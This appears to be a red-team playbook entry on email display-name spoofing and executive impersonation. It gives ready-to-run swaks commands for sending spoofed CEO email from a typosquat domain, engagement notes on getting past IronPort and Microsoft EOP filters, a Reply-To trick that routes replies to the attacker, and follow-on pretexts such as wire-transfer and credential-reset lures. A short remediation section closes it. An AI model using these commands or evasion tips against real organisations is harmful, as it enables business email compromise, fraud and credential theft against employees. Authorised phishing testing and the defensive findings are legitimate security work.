# Email Display Name Spoofing / Executive Impersonation

**MITRE:** [T1566 - Phishing](https://attack.mitre.org/techniques/T1566/) | [T1036.005 - Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/) | [T1656 - Impersonation](https://attack.mitre.org/techniques/T1656/)  
**Phase:** Initial Access  
**Auth Required:** No  
**Tags:** #initial-access #phishing #email #spoofing #impersonation #defense-evasion

---

## Summary
Craft email where the display name impersonates a trusted executive while the sending address belongs to attacker-controlled infrastructure. Most mail clients show only the display name, not the underlying address. When combined with a typosquat domain, this bypasses Anti_Spoof content filters that detect envelope/From header mismatches.

## Mechanism
- **Protocol:** SMTP
- **RPC/Function:** `From:` header display name field; `Reply-To:` header for response capture
- **Effect:** Recipient sees impersonated name; no domain mismatch triggers Anti_Spoof filters; DKIM signs the mail; SPF passes

## Commands
```bash
# Approach 1 — Display Name Spoof (recommended, highest deliverability)
# No domain mismatch — passes IronPort Anti_Spoof, EOP, all filters
swaks -4 \
  --to target@victim.com \
  --from executive@your-typosquat.com \
  --server localhost --port 25 \
  --header "From: CEO Name <executive@your-typosquat.com>" \
  --header "Reply-To: executive@your-typosquat.com" \
  --header "Subject: Quick question" \
  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
  --header "Date: $(date -R)" \
  --body "Body text here"

# Approach 2 — Header-From Spoof (demonstrates DMARC p=none gap)
# Only viable when DMARC p=none AND no custom Anti_Spoof filter
swaks -4 \
  --to target@victim.com \
  --from bounce@your-typosquat.com \
  --server localhost --port 25 \
  --header "From: CEO Name <dan@victim.com>" \
  --header "Reply-To: dan@victim.com" \
  --header "Subject: Quick question" \
  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
  --header "Date: $(date -R)" \
  --body "Body text here"
```

## Expected Output
```
# swaks on successful delivery
-> DATA
<-  250 2.0.0 OK: message accepted

# Target inbox — Approach 1
Sender shown: "CEO Name"
Address (if expanded): dan@target-portal.com   ← typosquat, reads plausible

# Target inbox — Approach 2
Sender shown: "CEO Name <ceo@corp.local>"  ← real address
```

## Notes
**corp.local engagement (2026-03-08):**
- **Approach 2 (header-from spoof):** Quarantined by IronPort's custom Anti_Spoof content filter. The filter detected envelope sender (`bounce@target-portal.com`) vs From header (`ceo@corp.local`) mismatch. Finding: detection working, but DMARC `p=none` means no hard block at policy layer — reportable gap.
- **Approach 1 (display name spoof):** Bypassed IronPort Anti_Spoof filter AND M365 EOP. Landed in inbox. No domain mismatch = nothing to flag.
- **Key insight:** Two separate filter layers. IronPort caught header-from spoof via custom content rule. M365 EOP would also catch it via its own anti-spoof. Display name spoof bypasses both because there is no mismatch to detect.

**M365 EOP brand protection (critical):**
- EOP quarantines mail from domains containing Microsoft product strings (`m365`, `outlook`, `azure`) regardless of SPF/DKIM/DMARC pass status
- First attempt used `m365-verify.com` as sending domain → quarantined by EOP brand protection
- Switched to `target-portal.com` (typosquat of `corp.local`) → delivered

**Mobile client behavior:**
- iOS Mail, Android Gmail: sender address hidden behind display name by default
- Attack surface is larger on mobile — `CEO Name` is all the recipient sees
- Desktop clients (Outlook, web) may show address on hover but display name is still primary

**Reply-To header:**
- Set `Reply-To` to attacker-controlled address even when `From:` is spoofed
- Ensures any reply goes to attacker, not to the real executive

## Relay / Follow-On Attack Path
- Payload: malicious link or attachment in body → credential harvest or malware delivery
- Pretext: wire transfer request, credential reset, VPN token, invoice approval

## Remediation
- DMARC `p=reject` blocks Approach 2; does not block Approach 1
- EOP/IronPort: configure anti-impersonation policy to flag external mail using internal display names
- EOP: enable "Impersonation protection" for key executives in anti-phishing policy
- User awareness: always verify sender address, especially before financial or credential actions

## Related
- [[ttps/recon/email-security-dns-recon]]
- [[ttps/resource-development/typosquat-domain-acquisition]]
- [[ttps/resource-development/dkim-infrastructure-setup]]
- [[ttps/defense-evasion/smtp-header-scrubbing]]
- [[playbooks/email-spoofing-chain]]
